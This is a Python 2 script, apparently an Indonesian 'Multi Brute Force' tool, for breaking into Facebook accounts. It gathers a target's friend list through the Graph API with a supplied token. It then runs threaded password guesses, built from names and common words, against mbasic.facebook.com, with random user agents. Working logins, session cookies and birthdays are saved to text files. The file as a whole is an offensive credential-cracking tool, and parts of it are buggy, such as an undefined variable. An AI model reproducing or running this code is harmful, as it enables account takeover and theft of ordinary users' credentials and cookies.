# coding=utf-8
#############################################
# Creator : Xenzi Ganz , Jeeck X Nano       #
# Github  : https://github.com/Xenzi-XN1    #
# Team    : Jeeck X nano, Riski, Xenzi Ganz #
#############################################

# Ricode Ajeh Gpp Redo Aing Mah

#############################################
#############################################
#############################################
#############################################
import requests, bs4, sys, os, random, time, re, json, calendar
from datetime import datetime
from datetime import date
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
reload(sys)
sys.setdefaultencoding('utf-8')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import bs4
    except ImportError:
        os.system('pip2 install bs4')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')
#############################################
    loop = 0
    ttl = []
    id = []
    ok = []
    cp = []
    ct = datetime.now()
    n = ct.month
    bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
    try:
        if n < 0 or n > 12:
            exit()
        nTemp = n - 1
    except ValueError:
        exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan_ttl = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
#############################################
ua1 = 'Mozilla/5.0 (Linux; Android 7.0; ASUS_X018D Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua2 = 'Mozilla/5.0 (Linux; Android 6.0; MEIZU_M5 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua3 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18B92 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]'
ua4 = 'Mozilla/5.0 (Linux; Android 10; N20Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua5 = 'Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua6 = 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010 Build/QKQ1.191014.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua7 = 'Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/280.0.0.9.119;]'
ua8 = 'Mozilla/5.0 (Linux; Android 10; CLT-L09 Build/HUAWEICLT-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/279.0.0.10.118;]'
ua9 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18F72 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]'
ua10 = 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua_random = random.choice([ua1, ua2, ua3, ua4, ua5, ua6, ua7, ua8, ua9, ua10])
#############################################
logo1 = """
  __  __ ___ ___
 |  \/  | _ ) __| | [+] Creator : Xenzi Ganzz
 | |\/| | _ \ _|  | [+] Github  : github.com/Xenzi-XN1
 |_|  |_|___/_|1.0| [+] Team    : Jeeck X nano, Riski
 Multi Brute Force   ( Metode Mbasic X Ua Random )
"""
#############################################
logo2 = """
  __  __ ___ ___
 |  \/  | _ ) __| | [+] Creator : Xenzi Ganzz
 | |\/| | _ \ _|  | [+] Github  : github.com/Xenzi-XN1
 |_|  |_|___/_|   | [+] Team    : Jeeck X nano, Riski
 Multi Brute Force   ( Login Lewat Token FB New )
"""
def log_token():
    os.system('clear')
    print logo2
    token = raw_input(' [+] Token: ')
    try:
        saya = requests.get('https://graph.facebook.com/me?access_token=%s' % token)
        open('login.txt', 'w').write(token)
        cek_akun()
    except KeyError:
        print '\n [!] Token invalid!'
        time.sleep(1)
        log_token()
#############################################
def menu():
    try:
        token = open('login.txt', 'r').read()
        saya = requests.get('https://graph.facebook.com/me/?access_token=%s' % token)
        i = json.loads(saya.text)
        name = i['name']
        id = i['id']
        ttl = i['birthday']
        month, day, year = ttl.split('/')
        month = bulan_ttl[month]
    except Exception as e:
        print '\n [!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        log_token()

    os.system('clear')
    print logo1
    print ' [•] Username      : %s ' % (name)
    print ' [•] ID facebook   : %s ' % (id)
    print ' [•] TTL facebook  : %s ' % (ttl)
    print '\n [01] Crack dari Public/Friend'
    print ' [02] Cek Hasil Crack CP/OK'
    print ' [00] Exit'
    pill = raw_input('\n [?] Choose : ')
    if pill in ('1', '01'):
        Public()
        crack()
    elif pill in ('2', '02'):
        cek_hasil()
    elif pill in ('3', '03'):
        print ' [+] Berhasil Menghapus Token'
        os.system('rm -rf login.txt')
        time.sleep(2)
        print ' [!] Keluar Dari Perogram'
    else:
        print '[!] Yang bener Kawan'

def cek_hasil():
    print '\n [01] Cek Akun CP'
    print ' [02] Cek Akun OK'
    print ' [03] Kembali Ke "Menu"\n'
    cek = raw_input(' [?] Choose : ')
    if cek in (''):
        print '\n [!] Janggan Kosong'
    elif cek in ('1', '01'):
        print '\n [!] Hasil Crack CP ( CP.txt )\n'
        os.system('cp.txt')
        exit()
    elif cek in ('2', '02'):
        print '\n [!] Hasil Crack OK ( OK.txt )\n'
        os.system('cp.txt')
        exit()
    elif cek in ('3', '03'):
        menu()
    else:
        print ' [!] Pilih Yang Bener'

def cek_akun():
    try:
        token = open('login.txt', 'r').read()
        saya = requests.get('https://graph.facebook.com/me/?access_token=%s' % token)
        i = json.loads(saya.text)
        name = i['name']
        id = i['id']
        ttl = i['birthday']
        month, day, year = ttl.split('/')
        month = bulan_ttl[month]
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')
        log_token()

    #requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token)
    menu()

def Public():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n [!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        log_token()

    idt = raw_input('\n [•] Masukan Id Target\n [+] ID target: ')
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
            id1 = i['id']
            user1 = i['name']
            id.append(id1 + '|' + user1)

    except KeyError:
        exit('\n [!] id Private ')

    if len(id) == 0:
        print ('\n [!] Hasil ID Eror')
        time.sleep(2)
        Public()
    else:
        print '\n [+] Nama     : %s' % (user1)
        print ' [+] Total id : %s' % (len(id))

def crack():
    Pw1 = raw_input('\n [•] Inggin Menggunakan Pw Default/Manual d/m : ')
    if Pw1 in ('m', 'M'):
        with ThreadPoolExecutor(max_workers=30) as (ganz):
          asu = raw_input(' [+] Contoh password: sayang, ganteng\n  %s[+] Pasword: ').split(',')
          if len(asu) == '':
             exit(' [!] Janggan Kosong!')
          print '\n [•] Hasil Ok Tersimpan di : ok.txt\n [•] Hasil CP Tersimpan di : cp.txt'
          for user in id:
             uid, name = user.split('|')
             ganz.submit(mbasic, uid, asu)

        hasil()
    elif Pw1 == 'd':
          with ThreadPoolExecutor(max_workers=35) as (ganz):
            print '\n [•] Hasil Ok Tersimpan di : ok.txt\n [•] Hasil CP Tersimpan di : cp.txt\n'
            for user in id:
               uid, name = user.split('|')
               frist = name.split(' ')
               if len(frist) >= 6:
                   pw2 = [
                    name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456']
               elif len(frist) <= 2:
                   pw2 = [
                    name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456']
               elif len(frist) <= 3:
                   pw2 = [
                    name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456']
               else:
                   pw2 = [
                   'sayang', 'bismillah', 'anjing', 'bangsat']
               ganz.submit(mbasic, uid, pw2)

          hasil()


def mbasic(uid, pw2):
    global loop
    global token
    ua_random = random.choice(['[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    '[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649505;FBDM/{density=2.625,width=1080,height=2034};FBLC/sv_SE;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Mozilla/5.0 (Linux; Android 10; motorola one macro Build/QMDS30.47-33-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]'])

    sys.stdout.write('\r [Crack] %s/%s OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pw2:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua_random, 'Host': 'mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass

        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        qobil = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[OK] %s | %s | %s | %s\x1b[0;97m ' % (uid, pw, send.json()['access_token'], kuki)
            ok.append('%s | %s' % (uid, pw))
            open('ok.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [CP] %s | %s | %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s | %s' % (uid, pw))
                    open('cp.txt', 'a').write('%s | %s | %s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r\x1b[1;33m [CP] %s | %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
            open('cp.txt', 'a').write('%s | %s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1



def hasil():
    if len(ok) != 0 or len(cp) != 0:
        print ' [+] Hasil Ok : %s' % (len(ok))
        print ' [+] Hasil CP : %s' % (len(cp))
    else:
        exit('\n [!] Ngga Ada Hasil :)')


if __name__ == '__main__':
    os.system('touch login.txt')
    menu()
#############################################
#############################################
